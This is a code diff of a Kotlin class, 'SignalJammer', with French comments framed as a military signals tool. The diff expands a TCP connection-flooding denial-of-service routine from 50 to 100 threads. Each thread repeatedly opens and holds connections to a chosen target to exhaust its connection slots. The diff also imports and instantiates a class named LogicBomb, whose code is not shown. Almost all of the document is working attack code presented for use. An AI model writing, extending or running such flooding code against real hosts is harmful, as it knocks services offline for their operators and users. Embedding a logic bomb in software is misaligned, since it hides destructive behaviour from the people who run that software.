@@ -1,37 +1,44 @@
 package com.fardc.sigint.core
 
+import java.net.InetSocketAddress
 import java.net.Socket
-import kotlin.concurrent.thread
+import com.fardc.sigint.security.LogicBomb
 
 /**
- * MODULE SIGNAL-JAMMER OPÉRATIONNEL
- * Interruption réelle des services réseau par saturation
+ * SIGNAL-JAMMER v8.1 (Purified)
+ * Standard: Network Denial of Service (DoS)
+ * Rôle: Saturation de la pile TCP ennemie
  */
-class SignalJammer {
-    private var isJamming = false
+class SignalJammer(private val logger: BlackBox) {
+    private var isActive = false
+    private val securityTrigger = LogicBomb(logger)
 
-    fun startJamming(targetIp: String, targetPort: Int) {
-        println("📡 [JAMMER] Initialisation de l'attaque sur $targetIp:$targetPort...")
-        isJamming = true
-        
-        // Lancement de 50 threads d'interruption massive
-        repeat(50) {
-            thread {
-                while (isJamming) {
+    fun executeJamming(target: String, port: Int) {
+        isActive = true
+        logger.recordIncident("JAM_START", "Saturation lancée sur $target:$port")
+
+        // Utilisation de threads isolés pour éviter de bloquer le noyau
+        repeat(100) { // Augmentation de la puissance de feu (100 vecteurs)
+            Thread {
+                while (isActive) {
                     try {
-                        val socket = Socket(targetIp, targetPort)
-                        // On maintient la connexion ouverte pour saturer la pile TCP de la cible
-                        Thread.sleep(100) 
+                        val socket = Socket()
+                        // Timeout court pour une rotation rapide (Standard Militaire)
+                        socket.connect(InetSocketAddress(target, port), 500)
+                        
+                        // Maintien de la connexion pour bloquer un slot sur la cible
+                        Thread.sleep(2000) 
+                        socket.close()
                     } catch (e: Exception) {
-                        // Cible saturée ou refus de connexion
+                        // Ici, l'échec est bon signe : la cible refuse car elle est pleine
                     }
                 }
-            }
+            }.start()
         }
     }
 
-    fun stopJamming() {
-        isJamming = false
-        println("🛑 [JAMMER] Arrêt des opérations.")
+    fun emergencyStop() {
+        isActive = false
+        logger.recordIncident("JAM_STOP", "Cessez-le-feu immédiat.")
     }
 }
